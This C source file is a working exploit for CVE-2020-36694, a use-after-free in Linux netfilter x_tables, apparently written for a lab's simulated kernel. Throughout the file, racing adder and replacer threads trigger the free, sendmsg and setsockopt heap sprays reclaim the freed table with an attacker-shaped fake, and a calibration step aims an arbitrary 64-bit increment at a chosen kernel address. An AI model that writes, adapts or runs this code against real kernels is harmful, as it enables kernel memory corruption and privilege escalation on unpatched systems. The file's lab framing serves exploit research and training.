/*
 * xt36694 — CVE-2020-36694 weapon: race trigger + UAF reclaim + arbitrary
 * increment aiming, for the xt36694 lab (sim kernel zImage / zImage-xt).
 *
 * Stages (all from uid 3032 + IPT capability, plain setsockopt/sendmsg):
 *  1. race      — adder vs replacer threads prove the UAF (M35);
 *  2. spray     — blocked-sendmsg control buffers reclaim the freed 1 KiB
 *                 xt_table_info with a fully attacker-shaped fake;
 *  3. calibrate — plant pcnt=0: the instrumented kernel's X9AC add lines
 *                 print the resolved percpu unit base for cpu0;
 *  4. aim       — plant pcnt = target - unit_base: the walk performs
 *                 *(u64*)target += chosen_delta (arbitrary 32-bit-addressable
 *                 64-bit add; bcnt delta sent as 0 to keep the +8 slot clean).
 *
 *   xt36694 [--table raw] [--rounds N] [--target-addr 0xADDR] [--unit-base 0xADDR]
 *           [--delta 1] [--sprayers 8] [--no-pin]
 * target-addr 0 (default) = calibration mode.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/un.h>
#include "ipt_blob.h"

static const char *g_table = "raw";
static unsigned g_rounds = 2000;
static unsigned long g_target = 0;
static unsigned long g_unit_base = 0;
static unsigned long g_delta = 1;
static unsigned g_sprayers = 8;
static int g_pin = 1;

static volatile int g_stop;
static volatile unsigned g_anomalies, g_reclaims_seen;
static unsigned long g_adds_ok, g_adds_err, g_rep_ok, g_rep_err;

static void pin(int cpu)
{
	if (!g_pin) return;
	cpu_set_t s;
	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	sched_setaffinity(0, sizeof(s), &s);
}

/* ---------- ADD_COUNTERS blob ---------- */
static int do_add_counters(int fd, const char *table, unsigned n,
			   unsigned long dpcnt, unsigned long dbcnt)
{
	struct { char name[XT_TABLE_MAXNAMELEN]; uint32_t num_counters;
		 struct xt_counters cs[]; } *ci;
	ci = calloc(1, sizeof(*ci) + n * sizeof(struct xt_counters));
	if (!ci) return -1;
	strncpy(ci->name, table, XT_TABLE_MAXNAMELEN - 1);
	ci->num_counters = n;
	for (unsigned i = 0; i < n; i++) {
		ci->cs[i].pcnt = dpcnt;
		ci->cs[i].bcnt = dbcnt;
	}
	int rc = setsockopt(fd, IPPROTO_IP, IPT_SO_SET_ADD_COUNTERS, ci,
			    sizeof(*ci) + n * sizeof(struct xt_counters));
	free(ci);
	return rc;
}

/* ---------- fake payload (spray content) ---------- */
static void *g_fake;
static size_t g_fake_len;

static void build_fake(unsigned number)
{
	struct bb_fake_ent ents[8];
	unsigned n = number < 8 ? number : 8;
	for (unsigned i = 0; i < n; i++) {
		unsigned long pcnt;
		if (g_target == 0)        pcnt = 0;                    /* calibrate */
		else if (g_unit_base)     pcnt = g_target - g_unit_base; /* aim */
		else                      pcnt = 0;
		ents[i].target = pcnt;
	}
	g_fake_len = 1024;
	g_fake = bb_fake_payload(number, ents, n, g_fake_len);
	printf("fake payload: %zu bytes, %u entries, mode=%s pcnt=%#lx\n",
	       g_fake_len, n, g_target == 0 ? "CALIBRATE" : "AIM",
	       (unsigned long)(g_target ? (g_unit_base ? g_target - g_unit_base : 0) : 0));
}

/* ---------- spray: blocked sendmsg holding kmalloc'd ctl buffers ---------- */
#define MAXQ 64
static int g_q[MAXQ], g_nq;

/* one shared, permanently-full dgram queue: every blocking sendmsg against
 * it allocates the control buffer (our fake bytes, kmalloc-1024) BEFORE
 * parking on the full queue — so each sprayer holds a fresh 1 KiB chunk of
 * fake content for the duration of its timeout */
static int g_snd;

static void fill_queue(void)
{
	struct sockaddr_un a = { .sun_family = AF_UNIX };
	int rcv = socket(AF_UNIX, SOCK_DGRAM, 0);
	g_snd = socket(AF_UNIX, SOCK_DGRAM, 0);
	strcpy(a.sun_path, "@x9spray");
	a.sun_path[0] = '\0';
	bind(rcv, (struct sockaddr *)&a, sizeof(a));
	connect(g_snd, (struct sockaddr *)&a, sizeof(a));
	struct timeval tv = { .tv_usec = 60000 };
	setsockopt(g_snd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof tv);
	char junk[128];
	memset(junk, 'A', sizeof junk);
	while (send(g_snd, junk, sizeof junk, MSG_DONTWAIT) >= 0)
		;
}

struct spray_arg { int id; };
static void *spray_thread(void *arg)
{
	struct spray_arg *sa = arg;
	/* SAME CPU as the replacer: SLUB hands the freed chunk to the next
	 * kmalloc on that cpu's freelist */
	pin(1);
	struct msghdr mh;
	struct iovec iov;
	char one = 'B';
	memset(&mh, 0, sizeof mh);
	iov.iov_base = &one; iov.iov_len = 1;
	mh.msg_iov = &iov; mh.msg_iovlen = 1;
	mh.msg_control = g_fake;
	mh.msg_controllen = g_fake_len;
	unsigned long cyc = 0;
	int sfd = bb_sock();
	if (sa->id < 2) {
		/* persistent holders via sendmsg ctl (park with allocation) */
		while (!g_stop) { sendmsg(g_snd, &mh, 0); cyc++; }
	} else {
		/* fast spray via the xt family's own allocator: a failing
		 * ADD_COUNTERS (bogus table name) still kvmallocs + copies our
		 * full blob, then errors and frees — same cache as the victim
		 * tables, no validation touches the content. */
		while (!g_stop) {
			setsockopt(sfd, IPPROTO_IP, IPT_SO_SET_ADD_COUNTERS,
				   g_fake, g_fake_len);
			cyc++;
		}
	}
	fprintf(stderr, "[spray %d] %lu cycles\n", sa->id, cyc);
	return NULL;
}

/* ---------- victim threads ---------- */
static void *adder_thread(void *arg)
{
	(void)arg;
	pin(0);
	int fd = bb_sock();
	if (fd < 0) return NULL;
	for (unsigned r = 0; r < g_rounds && !g_stop; r++) {
		struct ipt_getinfo gi;
		if (bb_getinfo(fd, g_table, &gi) != 0) { g_adds_err++; continue; }
		if (do_add_counters(fd, g_table, gi.num_entries, g_delta, 0) == 0)
			g_adds_ok++;
		else
			g_adds_err++;
	}
	return NULL;
}

static void *replacer_thread(void *arg)
{
	(void)arg;
	pin(1);
	int fd = bb_sock();
	if (fd < 0) return NULL;
	for (unsigned r = 0; r < g_rounds && !g_stop; r++) {
		struct ipt_getinfo gi;
		if (bb_getinfo(fd, g_table, &gi) != 0) { g_rep_err++; continue; }
		/* ALTERNATE size classes: each replace frees class A while
		 * allocating class B, so the freed chunk is not reclaimed by
		 * our own next table — it is left for the spray. */
		unsigned rules = (r & 1) ? 0 : 4;
		struct ipt_replace *rep = bb_build(g_table, &gi, rules,
						   BB_VACCEPT, BB_VACCEPT);
		if (!rep) { g_rep_err++; continue; }
		if (bb_set_replace(fd, rep) == 0) g_rep_ok++; else g_rep_err++;
		bb_free_replace(rep);
		usleep(3000);   /* let the sprayers claim the freed chunk */
	}
	return NULL;
}

/* ---------- watcher: counters anomaly + reclaim evidence ---------- */
static void *watcher_thread(void *arg)
{
	(void)arg;
	int fd = bb_sock();
	if (fd < 0) return NULL;
	while (!g_stop) {
		struct ipt_getinfo gi;
		if (bb_getinfo(fd, g_table, &gi) == 0 && gi.size) {
			struct ipt_get_entries *ge = bb_get_entries(fd, &gi);
			if (ge) {
				unsigned off;
				for (off = 0; off < ge->size; off +=
				     ((struct ipt_entry *)((char *)ge->entrytable + off))->next_offset) {
					struct ipt_entry *e = (struct ipt_entry *)((char *)ge->entrytable + off);
					if (e->counters.pcnt >= 0x10000) {
						printf("ANOMALY: pcnt=%llu bcnt=%llu off %u\n",
						       (unsigned long long)e->counters.pcnt,
						       (unsigned long long)e->counters.bcnt, off);
						g_anomalies++;
					}
				}
				free(ge);
			}
		}
		usleep(50000);
	}
	close(fd);
	return NULL;
}

int main(int argc, char **argv)
{
	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--table") && i + 1 < argc) g_table = argv[++i];
		else if (!strcmp(argv[i], "--rounds") && i + 1 < argc) g_rounds = strtoul(argv[++i], NULL, 0);
		else if (!strcmp(argv[i], "--target-addr") && i + 1 < argc) g_target = strtoul(argv[++i], NULL, 0);
		else if (!strcmp(argv[i], "--unit-base") && i + 1 < argc) g_unit_base = strtoul(argv[++i], NULL, 0);
		else if (!strcmp(argv[i], "--delta") && i + 1 < argc) g_delta = strtoul(argv[++i], NULL, 0);
		else if (!strcmp(argv[i], "--sprayers") && i + 1 < argc) g_sprayers = strtoul(argv[++i], NULL, 0);
		else if (!strcmp(argv[i], "--no-pin")) g_pin = 0;
		else { fprintf(stderr, "unknown arg %s\n", argv[i]); return 2; }
	}
	printf("xt36694: table=%s rounds=%u target=%#lx unit_base=%#lx delta=%lu sprayers=%u\n",
	       g_table, g_rounds, g_target, g_unit_base, g_delta, g_sprayers);

	int probe = bb_sock();
	struct ipt_getinfo gi;
	if (bb_getinfo(probe, g_table, &gi) != 0) {
		fprintf(stderr, "table %s unavailable\n", g_table);
		return 1;
	}
	build_fake(gi.num_entries);
	close(probe);
	fill_queue();
	pthread_t th[16];
	pthread_create(&th[0], NULL, adder_thread, NULL);
	pthread_create(&th[1], NULL, replacer_thread, NULL);
	pthread_create(&th[2], NULL, watcher_thread, NULL);
	unsigned nth = 3;
	static struct spray_arg sargs[8];
	for (unsigned i = 0; i < g_sprayers && i < 8; i++) {
		sargs[i].id = i;
		pthread_create(&th[nth++], NULL, spray_thread, &sargs[i]);
	}
	pthread_join(th[0], NULL);          /* adder: ends by rounds   */
	pthread_join(th[1], NULL);          /* replacer: ends by rounds */
	g_stop = 1;                         /* release watcher+sprayers */
	for (unsigned i = 2; i < nth; i++)
		pthread_join(th[i], NULL);

	printf("stats: replaces ok/err %lu/%lu  adds ok/err %lu/%lu  anomalies %u\n",
	       g_rep_ok, g_rep_err, g_adds_ok, g_adds_err, g_anomalies);
	if (g_anomalies) return 3;
	return 0;
}
